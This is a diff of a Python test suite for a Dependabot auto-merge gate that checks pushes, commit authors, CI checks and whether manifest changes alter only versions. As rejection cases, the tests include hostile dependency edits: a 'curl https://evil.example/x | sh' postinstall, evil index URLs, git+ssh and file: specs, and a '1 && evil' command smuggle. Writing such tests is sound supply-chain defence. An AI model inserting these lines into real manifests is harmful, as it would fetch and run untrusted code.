@@ -11,11 +11,18 @@ import unittest
 from typing import Any
 from unittest import mock
 
-from kit_fixtures import ecosystem, landing
+from kit_fixtures import ecosystem, landing, run_form
 
 SLUG = "kleidos-dev/boards"
 HEAD, NEW_HEAD, MAIN = "a" * 40, "b" * 40, "c" * 40
 OWNER = "someone"
+BRANCH = "dependabot/pip/x-1.3.0"
+GATE = {
+    "name": landing.GATE,
+    "status": "completed",
+    "conclusion": "success",
+    "app": {"id": landing.ACTIONS_APP},
+}
 MESSAGE = (
     "Bump x from 1.2.0 to 1.3.0\n\n---\nupdated-dependencies:\n- dependency-name: x\n"
     "  dependency-version: 1.3.0\n  update-type: version-update:semver-minor\n...\n"
@@ -41,7 +48,7 @@ def pull(**more: Any) -> dict[str, Any]:
         "draft": False,
         "html_url": "https://x/7",
         "user": {"login": landing.BOT, "type": "Bot"},
-        "head": {"sha": HEAD, "repo": dict(repo)},
+        "head": {"sha": HEAD, "ref": BRANCH, "repo": dict(repo)},
         "base": {"ref": "main", "repo": dict(repo)},
         **more,
     }
@@ -53,18 +60,24 @@ def changed(
     return {"filename": name, "status": "modified", "patch": patch, **more}
 
 
+def push(actor: str = landing.BOT, after: str = HEAD, kind: str = "push") -> dict[str, Any]:
+    return {"activity_type": kind, "actor": {"login": actor}, "after": after}
+
+
 class RefusalTest(unittest.TestCase):
     def why(
         self,
         of: dict[str, Any] | None = None,
         commits: list[dict[str, Any]] | None = None,
         files: list[dict[str, Any]] | None = None,
+        pushes: list[dict[str, Any]] | None = None,
     ) -> str:
         return str(
             landing.refusal(
                 of or pull(),
                 [commit()] if commits is None else commits,
                 [changed()] if files is None else files,
+                [push(kind="branch_creation")] if pushes is None else pushes,
                 OWNER,
             )
         )
@@ -112,45 +125,190 @@ class RefusalTest(unittest.TestCase):
         self.assertEqual(self.why(commits=[commit(), merge]), "None")
         self.assertIn("is someone's", self.why(commits=[commit("x", author={"login": OWNER})]))
 
-    def test_what_the_files_change(self) -> None:
+    def test_a_foreign_commit_is_caught_wherever_it_is(self) -> None:
+        for foreign in (
+            commit(author={"login": "app[bot]"}),
+            commit(author={"login": OWNER}),
+            commit(committer={"login": "someone"}),
+        ):
+            for at in range(3):
+                commits = [commit(), commit()]
+                commits.insert(at, foreign)
+                with self.subTest(at=at):
+                    self.assertNotEqual(self.why(commits=commits), "None")
+                    self.assertIn(f"commit {HEAD[:7]}", self.why(commits=commits))
+
+    def test_who_pushed_to_its_branch(self) -> None:
+        for pushes, needle in (
+            ([push(kind="branch_creation"), push()], "None"),
+            ([push(OWNER), push(after=MAIN)], "None"),
+            ([push(), push("app[bot]", MAIN)], "push of its branch by app[bot]"),
+            ([push("app[bot]", MAIN), push()], "push of its branch by app[bot]"),
+            ([push("other", kind="force_push")], "force_push of its branch by other"),
+            ([{"activity_type": "push", "actor": None, "after": HEAD}], "by None"),
+            ([push(after=MAIN)], "its head is not on the record"),
+            ([], "its head is not on the record"),
+            ([push()] * 100, "too many pushes"),
+            ([push()] * 99, "None"),
+        ):
+            with self.subTest(needle=needle):
+                self.assertIn(needle, self.why(pushes=pushes))
+
+    def test_which_files_are_read(self) -> None:
         sha = "d" * 40
-        new = f"+      - uses: a/b@{sha} # v2"
-        uses = f"@@ -1 +1 @@\n context: x\n-      - uses: a/b@{HEAD} # v1\n{new}"
+        uses = f"@@\n-      - uses: a/b@{HEAD} # v1\n+      - uses: a/b@{sha} # v2"
         rev = "@@\n-    rev: v3.0.0\n+    rev: v3.1.0"
-        uses_line, other_line = (f"  - uses: {name}@{sha} # uses: a/b@x" for name in ("a/b", "c/d"))
+        json_patch = '@@\n-    "a": "1.0.0"\n+    "a": "1.0.1"'
+        workflows = "proves nothing about a change under .github/"
         for one, needle in (
             (changed(), "None"),
-            (changed("a/package-lock.json", patch=""), "None"),
-            (changed("pnpm-lock.yaml"), "None"),
-            (changed("quality/requirements-tools.in"), "None"),
-            (changed(".github/workflows/ci.yml", uses), "None"),
-            (changed(".github/workflows/ci.yaml", uses), "None"),
-            (changed(".pre-commit-config.yaml", rev), "None"),
-            (
-                changed(".github/workflows/ci.yml", uses + "\n+      run: evil"),
-                "more than a version",
-            ),
-            (changed(".github/workflows/ci.yml", "@@\n+  uses: a/b@main"), "more than a version"),
-            (changed(".github/workflows/ci.yml", rev), "more than a version"),
-            (changed(".pre-commit-config.yaml", rev + "\n+    entry: x"), "more than a version"),
-            (changed(".pre-commit-config.yaml", uses), "more than a version"),
-            (
-                changed(".github/workflows/ci.yml", uses.replace(new, new.replace("a/b", "c/d"))),
-                "calls another action",
-            ),
-            (changed(".github/workflows/ci.yml", f"{uses}\n{new}"), "calls another action"),
-            (changed(".github/workflows/ci.yml", f"@@\n+{uses_line}\n-{other_line}"), "another"),
-            (changed(".github/workflows/ci.yml", ""), "shows no diff"),
-            (changed(".github/workflows/run.sh", uses), "neither a manifest"),
-            (changed("src/main.py"), "neither a manifest"),
-            (changed("README.md"), "neither a manifest"),
-            (changed(".github/workflows/x/action.yml/../../y.py"), "neither a manifest"),
-            (changed("sub/.pre-commit-config.yaml", rev), "neither a manifest"),
+            (changed("requirements-dev.in"), "None"),
+            (changed("quality/requirements-tools.txt"), "None"),
+            (changed("pyproject.toml", '@@\n-  "x==1",\n+  "x==2",'), "None"),
+            (changed("a/package.json", json_patch), "None"),
+            (changed("package-lock.json", json_patch), "None"),
+            (changed(".github/workflows/ci.yml", uses), workflows),
+            (changed(".github/requirements.txt"), workflows),
+            (changed(".github/workflows/x", status="added"), workflows),
+            (changed(".pre-commit-config.yaml", rev), "is no manifest"),
+            (changed("action.yml", uses), "is no manifest"),
+            (changed("scripts/deploy.sh.in"), "is no manifest"),
+            (changed("Makefile.in"), "is no manifest"),
+            (changed("requirements.txt/x.py"), "is no manifest"),
+            (changed("requirements.txt.sh"), "is no manifest"),
+            (changed("xrequirements.txt"), "is no manifest"),
+            (changed("pyproject.toml.x"), "is no manifest"),
+            (changed("xpyproject.toml"), "is no manifest"),
+            (changed("xpackage.json", json_patch), "is no manifest"),
+            (changed("package.json.js", json_patch), "is no manifest"),
+            (changed("pnpm-lock.yaml"), "is no manifest"),
+            (changed("pnpm-workspace.yaml"), "is no manifest"),
+            (changed("uv.lock"), "is no manifest"),
+            (changed("src/main.py"), "is no manifest"),
+            (changed("requirements.txt", ""), "shows no diff"),
+            (changed("requirements.txt", patch="@@ -1 +1 @@\n context"), "shows no diff"),
+            ({"filename": "requirements.txt", "status": "modified"}, "shows no diff"),
             (changed("requirements.txt", status="added"), "is added"),
             (changed("requirements.txt", status="renamed"), "is renamed"),
         ):
-            with self.subTest(file=one["filename"], patch=one["patch"]):
-                self.assertIn(needle, self.why(files=[changed(), one]))
+            with self.subTest(file=one["filename"]):
+                for files in ([changed(), one], [one, changed()]):
+                    self.assertIn(needle, self.why(files=files))
+
+    def lines(self, name: str, old: list[str], new: list[str]) -> bool:
+        """Whether those lines in place of these are only versions."""
+        patch = "\n".join(["@@ -1 +1 @@", " x", *(f"-{o}" for o in old), *(f"+{n}" for n in new)])
+        return landing.file_refusal(changed(name, patch)) is None
+
+    def test_what_a_line_of_requirements_may_change(self) -> None:
+        one, two, three = (f"    --hash=sha256:{c * 64}" for c in "abc")
+        for old, new, accepted in (
+            (["x==1.0"], ["x==1.1"], True),
+            (["x==1.0"], ["x==1.1.post1"], True),
+            (["x[a]==1.0 ; python_version < '3.9'"], ["x[a]==1.1 ; python_version < '3.9'"], True),
+            (["x==1.0 \\", one], ["x==1.1 \\", two], True),
+            (["x==1.0 \\", one], ["x==1.1 \\", f"{two} \\", three], True),
+            (["x==1.0 \\", f"{one} \\", two], ["x==1.1 \\", three], True),
+            (["x==1.0", "    # via y"], ["x==1.1", "    # via z", "    # more"], True),
+            (["x>=1,<2"], ["x>=1.5,<2"], True),
+            (["x==1.0", "y==1"], ["x==1.1", "y==2"], True),
+            (["x==1.0"], ["y==1.1"], False),
+            (["x==1.0"], ["x>=1.1"], False),
+            (["x==1.0"], ["x"], False),
+            (["x==1.0"], ["x[evil]==1.1"], False),
+            (["x==1.0"], ["x==1.1", "y==1.0"], False),
+            (["x==1.0", "y==1.0"], ["x==1.1"], False),
+            (["x==1.0", "y==1.0"], ["y==1.1", "x==1.1"], False),
+            (["x==1.0"], ["x==1.1 --index-url https://evil.example"], False),
+            (["x==1.0"], ["x==1.1", "--extra-index-url https://evil.example/simple"], False),
+            (["x==1.0"], ["x @ https://evil.example/x-1.1.tar.gz"], False),
+            (["x==1.0"], ["-r evil.txt"], False),
+            (["x==1.0"], ["-e ."], False),
+            (["x==1.0 \\", one], ["x==1.1"], False),
+            (["x==1.0 \\", one], ["x==1.1 \\", "    --hash=md5:" + "a" * 32], False),
+            (["x==1.0 ; python_version < '3.9'"], ["x==1.1"], False),
+            ([], ["y==1.0"], False),
+            (["x==1.0"], [], False),
+        ):
+            with self.subTest(old=old, new=new):
+                self.assertIs(self.lines("requirements.txt", old, new), accepted)
+
+    def test_what_a_line_of_pyproject_may_change(self) -> None:
+        for old, new, accepted in (
+            (['dependencies = ["x==1", "y>=2"]'], ['dependencies = ["x==2", "y>=3"]'], True),
+            (['requires = ["setuptools==80"]'], ['requires = ["setuptools==81"]'], True),
+            ([], ["[tool.pytest.ini_options]", 'addopts = "-p evil"'], False),
+            (['build-backend = "a"'], ['build-backend = "evil"'], False),
+            (['  "x==1",'], ['  "x @ https://evil.example/x==2",'], False),
+        ):
+            with self.subTest(old=old, new=new):
+                self.assertIs(self.lines("pyproject.toml", old, new), accepted)
+
+    def test_what_a_line_of_npm_may_change(self) -> None:
+        def entry(version: str = "1.0.0", host: str = "registry.npmjs.org", **of: str) -> list[str]:
+            name = of.get("name", "@a/b-2")
+            base = name.rpartition("/")[2]
+            return [
+                f'    "node_modules/{name}": {{',
+                f'      "version": "{version}",',
+                f'      "resolved": "https://{host}/{name}/-/{base}-{version}.tgz",',
+                f'      "integrity": "{of.get("hash", "sha512")}-{of.get("fill", "A") * 86}==",',
+            ]
+
+        def ranges(value: str) -> list[str]:
+            return [f'        "undici-types": "{value}"']
+
+        for old, new, accepted in (
+            (entry(), entry("1.1.0", fill="B"), True),
+            (entry(), entry("1.1.0-rc.1", fill="B"), True),
+            (ranges(">=7.24.0 <7.24.7"), ranges("~8.9.0"), True),
+            (ranges("^1.0.0"), ranges("^1.1.0 || >= 2"), True),
+            (ranges("1.0.0 - 2.0.0"), ranges("*"), True),
+            (['    "x": "1.0.0",'], ['    "x": "1.0.1"'], False),
+            (entry(), entry("1.1.0", "evil.example"), False),
+            (entry(), entry("1.1.0", "registry.npmjs.org.evil.example"), False),
+            (entry(), entry("1.1.0", name="@a/evil"), False),
+            (entry(), entry("1.1.0", hash="sha1"), False),
+            (entry(), entry("1.1.0")[:3], False),
+            (entry(), [*entry("1.1.0"), '      "hasInstallScript": true,'], False),
+            (entry(), [*entry("1.1.0"), '      "license": "other",'], False),
+            (['      "license": "MIT",'], ['      "license": "BUSL-1.1",'], False),
+            (ranges("1.0.0"), ranges("npm:evil@1.0.0"), False),
+            (ranges("1.0.0"), ranges("git+ssh://git@evil.example/x"), False),
+            (ranges("1.0.0"), ranges("file:../evil"), False),
+            (ranges("1.0.0"), ranges("evil/x"), False),
+            (ranges("1.0.0"), ranges("latest"), False),
+            (ranges("1.0.0"), ['        "evil": "1.0.0"'], False),
+            ([], ['    "postinstall": "curl https://evil.example/x | sh",'], False),
+            (['    "test": "vitest"'], ['    "test": "evil"'], False),
+            (['    "test": "1"'], ['    "test": "1 && evil"'], False),
+            (["      # x"], ["      # y"], False),
+        ):
+            with self.subTest(old=old, new=new):
+                self.assertIs(self.lines("package.json", old, new), accepted)
+                self.assertIs(self.lines("package-lock.json", old, new), accepted)
+
+    def test_lines_apart_are_compared_apart(self) -> None:
+        for patch, accepted in (
+            ("@@\n-x==1\n+x==2\n y==1\n-z==1\n+z==2", True),
+            ("@@\n-x==1\n c\n+x==2", False),
+            ("@@\n-x==1\n y==1\n+z==2\n@@\n-z==1\n+x==2", False),
+            ("@@\n-x==1\n\\ No newline at end of file\n+x==2\n\\ No newline", True),
+        ):
+            with self.subTest(patch=patch):
+                self.assertIs(landing.file_refusal(changed(patch=patch)) is None, accepted)
+
+    def test_what_is_said_of_a_line(self) -> None:
+        patch = "@@\n-x==1\n+x==2\n+--index-url evil " + "y" * 99
+        why = str(landing.file_refusal(changed(patch=patch)))
+        self.assertTrue(
+            why.startswith("requirements.txt changes more than a version: --index-url evil yyy"),
+            why,
+        )
+        self.assertLess(len(why), 140)
+        self.assertIn("a version: x==…", str(landing.file_refusal(changed(patch="@@\n-x==1"))))
+        moved = landing.file_refusal(changed(patch="@@\n-x==1\n-y==1\n+y==1\n+x==1"))
+        self.assertIn("a version: x==…", str(moved))
 
     def test_what_the_versions_are(self) -> None:
         def update(*levels: str) -> str:
@@ -164,13 +322,20 @@ class RefusalTest(unittest.TestCase):
             (update("patch", "minor", "patch"), "None"),
             (update("major"), "holds a major"),
             (update("patch", "major"), "holds a major"),
-            ("Bump x", "does not say"),
+            ("Bump x", f"commit {HEAD[:7]} does not say"),
             (update("minor") + "- dependency-name: y\n", "does not say"),
             (update("minor") + "  update-type: version-update:semver-minor\n", "does not say"),
             ("", "does not say"),
         ):
             with self.subTest(message=message):
                 self.assertIn(needle, self.why(commits=[commit(message)]))
+
+    def test_each_commit_says_its_own_versions(self) -> None:
+        for commits in ([commit(), commit("Bump y")], [commit("Bump y"), commit()]):
+            self.assertIn("does not say", self.why(commits=commits))
+        major = MESSAGE.replace("minor", "major")
+        for commits in ([commit(), commit(major)], [commit(major), commit()]):
+            self.assertIn("holds a major", self.why(commits=commits))
 
     def test_a_merge_commit_says_nothing_of_the_versions(self) -> None:
         merge = commit(MESSAGE, author={"login": OWNER}, parents=[{}, {}])
@@ -192,24 +357,39 @@ class CheckStateTest(unittest.TestCase):
     def test_the_states(self) -> None:
         ci = self.run_of()
         bot = self.run_of("App", "")
+        gate = dict(GATE)
+        none = f"no {landing.GATE} of GitHub Actions succeeded on it"
         for workflows, checks, state in (
-            ([ci], [], "green"),
-            ([ci], [bot], "green"),
-            ([ci, self.run_of("Docs", conclusion="skipped")], [], "green"),
-            ([], [bot], "pending"),
-            ([self.run_of("CI", "push")], [], "pending"),
-            ([self.run_of(status="in_progress", conclusion=None)], [], "pending"),
-            ([ci, self.run_of("B", status="queued", conclusion=None)], [], "pending"),
-            ([ci], [{**bot, "status": "in_progress", "conclusion": None}], "pending"),
-            ([self.run_of(conclusion="failure")], [], "failing: CI"),
-            ([self.run_of(conclusion="cancelled")], [], "failing: CI"),
-            ([ci], [{**bot, "conclusion": "timed_out"}], "failing: App"),
-            ([self.run_of(conclusion="action_required")], [bot], "failing: CI"),
-            ([self.run_of(conclusion="skipped")], [bot], "nothing ran on it"),
-            ([ci, self.run_of("D", "push", conclusion="neutral")], [], "green"),
+            ([ci], [gate], "green"),
+            ([ci], [bot, gate], "green"),
+            ([ci, self.run_of("Docs", conclusion="skipped")], [gate], "green"),
+            ([], [bot, gate], "pending"),
+            ([self.run_of("CI", "push")], [bot, gate], "pending"),
+            ([self.run_of(status="in_progress", conclusion=None)], [gate], "pending"),
+            ([ci, self.run_of("B", status="queued", conclusion=None)], [gate], "pending"),
+            ([ci], [gate, {**bot, "status": "in_progress", "conclusion": None}], "pending"),
+            ([self.run_of(conclusion="failure")], [gate], "failing: CI"),
+            ([self.run_of(conclusion="cancelled")], [gate], "failing: CI"),
+            ([ci], [gate, {**bot, "conclusion": "timed_out"}], "failing: App"),
+            ([self.run_of(conclusion="action_required")], [gate], "failing: CI"),
+            ([self.run_of(conclusion="skipped")], [bot], none),
+            ([ci], [], none),
+            ([ci], [bot], none),
+            ([ci], [{**gate, "conclusion": "skipped"}], none),
+            ([ci], [{**gate, "conclusion": "neutral"}, gate], none),
+            ([ci], [{**gate, "conclusion": "failure"}], f"failing: {landing.GATE}"),
+            ([ci], [{**gate, "name": "✅ Check "}], none),
+            ([ci], [{**gate, "app": {"id": 1}}], none),
+            ([ci], [{**gate, "app": None}], none),
+            ([ci], [gate, {**gate, "app": {"id": 1}, "conclusion": "skipped"}], "green"),
+            ([ci, self.run_of("D", "push", conclusion="neutral")], [gate], "green"),
         ):
             with self.subTest(state=state, workflows=workflows, checks=checks):
                 self.assertEqual(landing.check_state(workflows, checks), state)
+
+    def test_the_gate_is_the_kits(self) -> None:
+        self.assertEqual(landing.GATE, run_form.GATE)
+        self.assertEqual(landing.ACTIONS_APP, 15368)
 
 
 class FakeApi(landing.Api):
@@ -220,6 +400,9 @@ class FakeApi(landing.Api):
         self.pull = pull()
         self.commits = [commit()]
         self.files = [changed()]
+        self.pushes = [push(), push(OWNER, NEW_HEAD)]
+        self.checks = [dict(GATE)]
+        self.ahead = 0
         self.runs: list[dict[str, Any]] = [
             {"name": "CI", "event": "pull_request", "status": "completed", "conclusion": "success"}
         ]
@@ -243,6 +426,13 @@ class FakeApi(landing.Api):
             return copy.deepcopy(self.commits)
         if path.startswith(f"{base}/pulls/7/files"):
             return copy.deepcopy(self.files)
+        if path.startswith(f"{base}/activity?ref="):
+            assert path.endswith("?ref=refs%2Fheads%2Fdependabot%2Fpip%2Fx-1.3.0&per_page=100"), (
+                path
+            )
+            return self.pushes
+        if path == f"{base}/compare/main...{MAIN}":
+            return {"ahead_by": self.ahead}
         if path == f"{base}/commits/main":
             return {"sha": MAIN}
         if path.startswith(f"{base}/compare/{MAIN}..."):
@@ -250,7 +440,7 @@ class FakeApi(landing.Api):
         if path.startswith(f"{base}/actions/runs?head_sha={self.pull['head']['sha']}"):
             return {"workflow_runs": self.runs}
         if path.startswith(f"{base}/commits/{self.pull['head']['sha']}/check-runs"):
-            return {"check_runs": []}
+            return {"check_runs": self.checks}
         raise AssertionError(f"not asked for: {path}")
 
     def put(self, path: str, fields: dict[str, str]) -> Any:
@@ -311,7 +501,30 @@ class LanderTest(unittest.TestCase):
         self.api.files = [changed("src/x.py")]
         self.land()
         self.assertEqual(self.api.puts, [])
-        self.assertIn("neither a manifest", self.said[0])
+        self.assertIn("is no manifest", self.said[0])
+
+    def test_the_pushes_are_asked_for(self) -> None:
+        self.api.pushes = [push("app[bot]", NEW_HEAD), push()]
+        self.land()
+        self.assertEqual(self.api.puts, [])
+        self.assertIn("push of its branch by app[bot]", self.said[0])
+
+    def test_a_merge_of_something_else_is_left(self) -> None:
+        merge = commit("Merge", author={"login": OWNER}, parents=[{"sha": HEAD}, {"sha": MAIN}])
+        for ahead, merged in ((1, 0), (0, 1)):
+            self.api = FakeApi()
+            self.said.clear()
+            self.api.commits, self.api.ahead = [commit(), merge], ahead
+            self.land()
+            self.assertEqual(len(self.merged()), merged)
+            if ahead:
+                self.assertIn(f"commit {HEAD[:7]} merges what is not on main", self.said[0])
+
+    def test_without_the_gate_it_is_left(self) -> None:
+        self.api.checks = []
+        self.land()
+        self.assertEqual(self.merged(), [])
+        self.assertIn(f"no {landing.GATE} of GitHub Actions", self.said[0])
 
     def test_a_red_run_leaves_it(self) -> None:
         self.api.runs[0]["conclusion"] = "failure"
